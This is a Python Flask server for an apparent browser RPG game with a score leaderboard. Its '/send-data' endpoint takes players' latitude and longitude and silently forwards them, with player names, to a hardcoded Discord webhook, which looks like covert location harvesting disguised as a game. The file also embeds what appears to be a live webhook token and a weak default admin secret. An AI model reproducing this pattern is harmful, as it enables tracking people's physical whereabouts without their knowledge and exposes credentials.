import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

WEBHOOK_URL = os.environ.get(
    'DISCORD_WEBHOOK_URL',
    'https://discord.com/api/webhooks/1530803914130194592/El2eCKZqFs4Cq__hpaTwMOY3I5ZJFXAiKSZjz7C-KWIMLDlep7TvvTl6LQmnn_T1L1Cd'
)

ADMIN_SECRET = os.environ.get('ADMIN_SECRET', 'my-super-secret-admin-key')
global_leaderboard = []


@app.route('/')
def home():
    return render_template('index.html')


@app.route('/api/leaderboard', methods=['GET', 'POST', 'DELETE'])
def handle_leaderboard():
    global global_leaderboard
    
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        name = data.get('name', 'Anonymous').strip()[:20]
        score = data.get('score', 0)
        
        if isinstance(score, int) and score >= 0:
            global_leaderboard.append({"name": name if name else "Hero", "score": score})
            global_leaderboard = sorted(global_leaderboard, key=lambda x: x['score'], reverse=True)[:10]
            
        return jsonify({"status": "ok", "leaderboard": global_leaderboard})

    elif request.method == 'DELETE':
        auth_header = request.headers.get('X-Admin-Secret')
        if auth_header != ADMIN_SECRET:
            return jsonify({"status": "error", "message": "Unauthorized"}), 403
        
        data = request.get_json(silent=True) or {}
        index = data.get('index')
        
        if index is not None and isinstance(index, int):
            if 0 <= index < len(global_leaderboard):
                global_leaderboard.pop(index)
        else:
            global_leaderboard = []
            
        return jsonify({"status": "ok", "leaderboard": global_leaderboard})
    
    return jsonify(global_leaderboard)


@app.route('/send-data', methods=['POST'])
def send_data():
    payload = request.get_json(silent=True) or {}
    latitude = payload.get('latitude')
    longitude = payload.get('longitude')
    player_name = payload.get('name', 'Unknown Hero')

    if latitude is None or longitude is None:
        return jsonify({"status": "error", "message": "Missing coordinates"}), 400

    webhook_payload = {
        "embeds": [
            {
                "title": "⚔️ RPG Adventurer Joined",
                "color": 65280,
                "fields": [
                    {"name": "Hero Name", "value": str(player_name), "inline": False},
                    {"name": "Latitude", "value": str(latitude), "inline": True},
                    {"name": "Longitude", "value": str(longitude), "inline": True}
                ]
            }
        ]
    }

    try:
        requests.post(WEBHOOK_URL, json=webhook_payload, timeout=5)
    except Exception:
        pass

    return jsonify({"status": "ok", "latitude": latitude, "longitude": longitude})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)